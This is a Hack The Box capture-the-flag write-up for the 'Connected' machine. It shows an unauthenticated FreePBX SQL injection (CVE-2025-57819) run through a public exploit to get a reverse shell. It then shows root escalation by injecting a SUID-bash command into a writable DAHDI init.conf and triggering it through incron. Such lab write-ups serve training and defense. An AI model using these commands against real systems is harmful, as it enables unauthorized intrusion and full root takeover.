# HTB - Connected

**Author:** hero  
**Platform:** Hack The Box  
**Machine:** Connected  
**Difficulty:** Easy  
**Target:** Linux  
**Focus:** Nmap Enumeration, FreePBX, SQL Injection, Remote Code Execution, Linux Enumeration, Incron Abuse, SUID Privilege Escalation

---

## 1. Executive Summary

The initial access to Connected was obtained by exploiting an unauthenticated SQL injection vulnerability in FreePBX, identified as **CVE-2025-57819**.

By leveraging the vulnerability, I achieved Remote Code Execution and obtained an initial shell as the `asterisk` user.

During privilege escalation enumeration, I discovered an interesting configuration in `/etc/incron.d/` that monitored a file inside the Asterisk spool directory and triggered a system script whenever the monitored file was modified.

Further investigation revealed that the script executed a DAHDI initialization process that loaded a configuration file writable by the `asterisk` user.

By abusing this misconfiguration, I was able to inject a command into the configuration file that created a root-owned SUID Bash binary.

Executing the binary with the `-p` option allowed me to obtain a root shell and complete the machine.

---

## 2. Reconnaissance

### 2.1 Initial Port Scanning

I started by performing a full TCP port scan to identify all exposed services.

```bash
nmap -p- --min-rate 5000 <TARGET_IP>
```

The scan revealed three open ports:

| Port | Service |
|---|---|
| 22 | SSH |
| 80 | HTTP |
| 443 | HTTPS |

Next, I performed service and default-script enumeration:

```bash
nmap -p 22,80,443 -sC -sV <TARGET_IP>
```

The results identified OpenSSH 7.4 running on port 22, alongside HTTP and HTTPS services.

Although the SSH service presented an interesting enumeration possibility, I decided to focus on the web application first.

---

## 3. Initial Access – FreePBX RCE

### 3.1 Web Application Enumeration

Before accessing the application, I added the target IP address to `/etc/hosts`.

```bash
sudo nano /etc/hosts
```

Added:

```text
<TARGET_IP> connected.htb
```

After accessing the website, I identified the application as **FreePBX**.

The displayed version was:

```text
16.0.40.7
```

I searched for publicly disclosed vulnerabilities affecting FreePBX and discovered a critical vulnerability:

**CVE-2025-57819**

### 3.2 Understanding CVE-2025-57819

CVE-2025-57819 is a critical vulnerability affecting the FreePBX endpoint module.

The vulnerability is caused by insufficient sanitization of user-controlled input, allowing unauthenticated attackers to bypass authentication and perform arbitrary SQL operations.

Successful exploitation can lead to database manipulation and Remote Code Execution.

**Vulnerability Details:**

- CVE: CVE-2025-57819
- Severity: Critical
- CVSS 4.0: 10.0
- Vulnerability Types: Authentication Bypass / SQL Injection
- CWE: CWE-288, CWE-89
- Affected endpoint module versions:
  - FreePBX 15: versions before 15.0.66
  - FreePBX 16: versions before 16.0.89
  - FreePBX 17: versions before 17.0.3

The vulnerability affects the endpoint module, so the displayed FreePBX core version alone is not sufficient to establish the exact vulnerable module version.

### 3.3 Exploitation

I researched the vulnerability and obtained a Python exploit that automates the exploitation process.

The exploit performs the following operations:

1. Checks whether the target is vulnerable using an SQL injection probe.
2. Establishes a reverse shell listener.
3. Uses SQL injection to manipulate the application's database.
4. Injects a command into the cron job mechanism.
5. Executes the reverse shell payload when the scheduled job runs.

I saved the exploit as:

```text
exploit.py
```

The exploit was originally credited to **K3ysTr0K3R (Jared Brits)**.

I executed it against the target:

```bash
python3 exploit.py \
  -u http://connected.htb \
  --lhost <LOCAL_IP> \
  --lport 4444
```

After waiting approximately one or two minutes, I received a reverse shell.

I verified the current user:

```bash
whoami
```

**Result:**

```text
asterisk
```

I successfully obtained an initial shell as `asterisk`.

### 3.4 User Flag

After obtaining access, I navigated to the user's home directory and retrieved the user flag.

```bash
cat /home/asterisk/user.txt
```

---

## 4. Privilege Escalation – Asterisk to Root

### 4.1 System Enumeration

After obtaining the initial shell, I performed further Linux enumeration to identify potential privilege escalation vectors.

During enumeration, I inspected the Incron configuration directory:

```bash
cat /etc/incron.d/*
```

I discovered an interesting configuration entry:

```text
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

This was particularly interesting because it revealed that Incron was monitoring a file named `dahdi_restart`.

Whenever the monitored file was modified, the system executed:

```text
/usr/sbin/sysadmin_dahdi_restart
```

This provided a potential privilege escalation path.

### 4.2 Understanding the Incron Mechanism

Incron is a Linux daemon that monitors filesystem events and executes predefined commands when specific events occur.

In this case:

- **Monitored file:** `/var/spool/asterisk/sysadmin/dahdi_restart`
- **Event:** `IN_CLOSE_WRITE`
- **Executed script:** `/usr/sbin/sysadmin_dahdi_restart`

The `IN_CLOSE_WRITE` event is triggered when a file opened for writing is closed.

My next step was to investigate the script executed by this mechanism.

### 4.3 Analyzing the Root-Executed Script

I navigated to `/usr/sbin` and inspected the script:

```bash
cd /usr/sbin
cat sysadmin_dahdi_restart
```

The script contained commands responsible for stopping and restarting services, including:

```bash
/etc/init.d/asterisk stop
sleep 5
/etc/init.d/dahdi restart
```

I wanted to understand how the DAHDI restart process worked and whether it loaded any user-controlled configuration files.

I searched the initialization script for references to `init.conf`:

```bash
grep -n "init.conf" /etc/init.d/dahdi
```

The output revealed that the script referenced:

```text
/etc/dahdi/init.conf
```

I then checked its permissions:

```bash
ls -la /etc/dahdi/init.conf
```

<badge color="success">Privilege escalation opportunity identified</badge>

The file was writable by the `asterisk` user!

This was the critical misconfiguration.

Since the DAHDI initialization process was triggered by a script executed with root privileges, I investigated whether I could inject a command through the writable configuration file.

### 4.4 Exploiting the Writable Configuration File

I appended a command to the configuration file:

```bash
printf '\ninstall -m 4755 /bin/bash /home/asterisk/pwn1\n' >> /etc/dahdi/init.conf
```

The injected command was designed to:

1. Copy `/bin/bash` to `/home/asterisk/pwn1`.
2. Set the SUID permission bit (`4755`) on the copied binary.
3. Make the resulting Bash binary owned by root when executed through the root-privileged initialization process.

Next, I triggered the Incron event by modifying the monitored file:

```bash
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

The `touch` command created the file if it did not exist or updated its modification time if it already existed.

This generated the filesystem event monitored by Incron, causing the configured system script to execute.

The execution chain was:

```text
asterisk
   |
   v
Writable /etc/dahdi/init.conf
   |
   v
Inject command
   |
   v
Modify dahdi_restart
   |
   v
Incron detects IN_CLOSE_WRITE
   |
   v
Root-executed restart script
   |
   v
DAHDI loads init.conf
   |
   v
Root-owned SUID Bash created
```

### 4.5 Obtaining Root Access

After triggering the event, I checked whether the new binary had been created successfully:

```bash
ls -la /home/asterisk/pwn1
```

The output confirmed that the binary was owned by root and had the SUID bit enabled:

```text
-rwsr-xr-x 1 root root ... /home/asterisk/pwn1
```

The `s` in the owner's execute position indicated that the SUID permission was set.

I executed the binary using the `-p` option:

```bash
/home/asterisk/pwn1 -p
```

The `-p` option tells Bash to preserve its effective privileges instead of dropping them.

Finally, I verified my privileges:

```bash
whoami
id
```

**Result:**

```text
uid=0(root)
```

<badge color="success">Root access obtained</badge>

Machine successfully completed!

---

## 5. Attack Path Summary

The complete attack chain:

```text
Nmap Enumeration
       |
       v
FreePBX Discovery
       |
       v
CVE-2025-57819
       |
       v
Unauthenticated SQL Injection
       |
       v
Remote Code Execution
       |
       v
Initial Shell (asterisk)
       |
       v
Incron Enumeration
       |
       v
Writable DAHDI Configuration
       |
       v
Command Injection via init.conf
       |
       v
Trigger IN_CLOSE_WRITE Event
       |
       v
Root-Owned SUID Bash
       |
       v
ROOT
```

---

## 6. Key Takeaways

This machine demonstrated several important penetration testing techniques:

- **Service Enumeration:** Identifying exposed services through Nmap.
- **Web Application Enumeration:** Identifying FreePBX and researching its vulnerable components.
- **Unauthenticated SQL Injection:** Exploiting CVE-2025-57819.
- **Remote Code Execution:** Abusing database manipulation and scheduled execution to obtain a reverse shell.
- **Linux Post-Exploitation:** Enumerating system configurations and scheduled filesystem events.
- **Incron Enumeration:** Identifying privileged commands triggered by filesystem modifications.
- **Configuration File Abuse:** Exploiting a root-executed initialization process that loads a user-writable configuration file.
- **SUID Privilege Escalation:** Creating and executing a root-owned SUID Bash binary.

---

**Machine Completed: Connected**

**Author: hero**
